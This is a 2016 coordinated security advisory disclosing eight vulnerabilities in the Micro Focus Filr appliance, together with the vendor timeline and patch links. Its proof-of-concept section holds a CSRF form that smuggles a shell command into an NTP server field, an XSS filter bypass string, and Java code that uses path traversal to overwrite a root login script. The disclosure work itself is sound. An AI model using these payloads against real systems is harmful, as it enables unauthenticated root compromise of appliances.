@@ -1,0 +1,263 @@
+SEC Consult Vulnerability Lab Security Advisory < 20160725-0 >
+=======================================================================
+              title: Multiple vulnerabilities 
+            product: Micro Focus (former Novell) Filr Appliance
+ vulnerable version: Filr 2 <=2.0.0.421, Filr 1.2 <= 1.2.0.846
+      fixed version: Filr 2 v2.0.0.465, Filr 1.2 v1.2.0.871
+         CVE number: CVE-2016-1607, CVE-2016-1608, CVE-2016-1609
+                     CVE-2016-1610, CVE-2016-1611
+             impact: critical
+           homepage: https://www.novell.com/products/filr/
+              found: 2016-05-23
+                 by: W. Ettlinger (Office Vienna)
+                     SEC Consult Vulnerability Lab 
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Montreal - Moscow
+                     Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"Unlike other mobile file access and collaborative file sharing solutions, Micro
+Focus Filr has been designed with the enterprise in mind, resulting in less
+administration, better security and more productive users."
+
+URL: https://www.novell.com/products/filr/
+
+
+Business recommendation:
+------------------------
+During a very quick security check several vulnerabilities with high impact 
+have been discovered. SEC Consult recommends to immediately apply the patches 
+provided by Micro Focus to address these issues. 
+
+Please note that since SEC Consult did not conduct a thorough technical security
+check SEC Consult cannot make a statement regarding the overall security of the
+Micro Focus Filr appliance.
+
+
+Vulnerability overview/description:
+-----------------------------------
+During a quick security check several vulnerabilities have been identified that 
+ultimately allow an attacker to completely compromise the appliance:
+
+1) Cross Site Request Forgery (CSRF) - CVE-2016-1607
+Several functions within the appliance's administative interface lack protection
+against CSRF attacks. This allows an attacker who targets an authenticated 
+administrator to reconfigure the appliance.
+
+2) OS Command Injection - CVE-2016-1608
+The appliance administrative interface allows an authenticated attacker to 
+execute arbitrary operating system commands. Please note that an attacker can 
+combine this vulnerability with vulnerability #1. In this scenario, an attacker 
+does not need to be authenticated.
+
+3) Insecure System Design
+The appliance uses a Jetty application server to provide the appliance 
+administration interface. This application server is started as the superuser 
+"root". Please note that combined with vulnerability #1 and #2 an attacker can
+run commands as the superuser "root" without the need for any authentication.
+For vendor remark on #3 see solution section.
+
+4) Persistent Cross-Site Scripting - CVE-2016-1609
+The Filr web interface uses a blacklist filter to try to strip any JavaScript 
+code from user input. However, this filter can be bypassed to persistently 
+inject JavaScript code into the Filr web interface.
+
+5) Missing Cookie Flags
+The httpOnly cookie flag is not set for any session cookies set by both the 
+administrative appliance web interface and the Filr web interface. Please note 
+that combined with vulnerability #4 an attacker can steal session cookies of 
+both the appliance administration interface and the Filr web interface (since 
+cookies are shared across ports).
+For vendor remark on #5 see solution section.
+
+6) Authentication Bypass - CVE-2016-1610
+An unauthenticated attacker is able to upload email templates.
+
+7) Path Traversal - CVE-2016-1610
+The functionality that allows an administrator to upload email templates fails 
+to restrict the directory the templates are uploaded to. Please note that 
+combined with vulnerability #6 an attacker is able to upload arbitray files with
+the permissions of the system user "wwwrun".
+
+8) Insecure File Permissions - CVE-2016-1611
+A file that is run upon system user login is world-writeable. This allows a local 
+attacker with restricted privileges to inject commands that are being executed
+as privileged users as soon as they log into the system. Please note that 
+combined with vulnerabilities #6 and #7 an unauthenticated attacker can inject 
+commands that are executed as privileged system users (e.g. root) using the Filr
+web interface.
+
+
+Proof of concept:
+-----------------
+1, 2, 3)
+The following HTML fragment demonstrates that using a CSRF attack (#1) system 
+commands can be injected (#2) that are executed as the user root (#3):
+
+----- snip -----
+<html>
+  <body>
+    <form action="https://<host>:9443/vaconfig/time" method="POST">
+      <input type="hidden" name="ntpServer" value="0.novell.pool.ntp.org 1.novell.pool.ntp.org';id>/tmp/test;'" />
+      <input type="hidden" name="region" value="europe" />
+      <input type="hidden" name="timeZone" value="Europe/Vienna" />
+      <input type="hidden" name="utc" value="true" />
+      <input type="hidden" name="_utc" value="on" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+----- snip -----
+
+4)
+The following string demonstrates how the XSS filter can be circumvented:
+<img src='>' onerror='alert(1)'>
+
+This string can e.g. be used by a restricted user in the "phone" field of the 
+user profile. The script is executed by anyone viewing the profile (e.g. admins).
+
+5)
+None of the session cookies are set with the httpOnly flag.
+
+6, 7, 8)
+The following Java fragment demonstrates how an unauthenticated attacker (#6) 
+can overwrite a file in the filesystem (#7 & #8) that is executed upon user login 
+of e.g. the root user:
+
+----- snip -----
+String sessionCookie = "sectest";
+String host = "http://<host>/";
+
+ProxySettings settings = new ProxySettings();
+HttpCookie cookie = new HttpCookie("JSESSIONID", sessionCookie);
+
+settings.setCookieManager(new CookieManager());
+settings.getCookieManager().getCookieStore().add(new URI(host), cookie);
+
+settings.setModuleBaseUrl(host + "ssf/gwt/");
+settings.setRemoteServiceRelativePath("gwtTeaming.rpc");
+settings.setPolicyName("338D4038939D10E7FC021BD64B318D99");
+GwtRpcService svc = SyncProxy.createProxy(GwtRpcService.class, settings);
+
+VibeXsrfToken token = new VibeXsrfToken(
+		StringUtils.toHexString(Md5Utils.getMd5Digest(sessionCookie.getBytes())));
+((HasRpcToken) svc).setRpcToken(token);
+
+String fileName = "../../../../etc/profile.d/vainit.sh";
+FileBlob fileBlob = new FileBlob(ReadType.TEXT, fileName, "", 1l, 4, 1l, false, 4l);
+fileBlob.setBlobDataString("id > /tmp/profiledtest\n");
+BinderInfo folderInfo = new BinderInfo();
+folderInfo.setBinderId((long) 1);
+folderInfo.setBinderType(BinderType.WORKSPACE);
+folderInfo.setWorkspaceType(WorkspaceType.EMAIL_TEMPLATES);
+VibeRpcCmd cmd = new UploadFileBlobCmd(folderInfo, fileBlob, true);
+HttpRequestInfo ri = new HttpRequestInfo();
+svc.executeCommand(ri, cmd);
+----- snip -----
+
+
+Vulnerable / tested versions:
+-----------------------------
+The version 2.0.0.421 of Micro Focus Filr was found to be vulnerable. This version 
+was the latest version at the time of the discovery.
+
+According to the vendor, Filr 1.2 is also vulnerable.
+
+
+
+Vendor contact timeline:
+------------------------
+2016-05-23: Sending encrypted advisory to security@novell.com, Setting latest
+            possible release date to 2016-07-12
+2016-05-24: Initial response from Micro Focus: forwarded the information to Filr
+            engineering team
+2016-06-13: Micro Focus releases patch to address issue #8
+2016-06-14: Requested status update
+2016-06-14: Micro Focus expects release of the patches in early July
+2016-06-30: Asking for status update, answer of Micro Focus
+2016-07-06: Micro Focus needs more time to patch issues, release re-scheduled for 15th
+2016-07-12: Asking for status update; "final rounds of QA" at Micro Focus
+2016-07-16: Postponing advisory release, patch not yet ready
+2016-07-22: Patch release by Micro Focus
+2016-07-25: Coordinated advisory release
+  
+
+Solution:
+---------
+The "Filr 2.0 Security Update 2" can be downloaded here and should
+be applied immediately:
+https://download.novell.com/Download?buildid=3V-3ArYN85I~
+Those patches fix vulnerabilities #1, #2, #4, #6, #7
+
+"Filr 1.2 Security Update 3" can be found here:
+https://download.novell.com/Download?buildid=BOTiHcBFfv0~
+
+
+Knowledge base references at Micro Focus:
+Issue #1: https://www.novell.com/support/kb/doc.php?id=7017786
+Issue #2: https://www.novell.com/support/kb/doc.php?id=7017789
+Issue #4: https://www.novell.com/support/kb/doc.php?id=7017787
+Issue #6 & #7: https://www.novell.com/support/kb/doc.php?id=7017788
+
+Local privilege escalation via insecure file permissions (#8) has
+already been fixed in the Filr 2.0 security update 1 in June:
+https://www.novell.com/support/kb/doc.php?id=7017689
+
+
+Issue #3: According to Micro Focus, Jetty actually runs as user 
+"vabase-jetty" but will pass commands off to another service on
+the box that runs as root to perform privileged actions.
+They have fixed the command injection in this release and the
+next release will include much more stringent parameter validation
+for passing the commands.
+
+Issue #5: According to Micro Focus, a component of Filr does not
+function properly when the httpOnly flag is enabled. This will be
+addressed in a future release.
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Bangkok - Berlin - Linz - Montreal - Moscow
+Singapore - Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/Career.htm
+
+Interested in improving your cyber security with the experts of SEC Consult? 
+Contact our local offices https://www.sec-consult.com/en/About/Contact.htm
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF W. Ettlinger / @2016
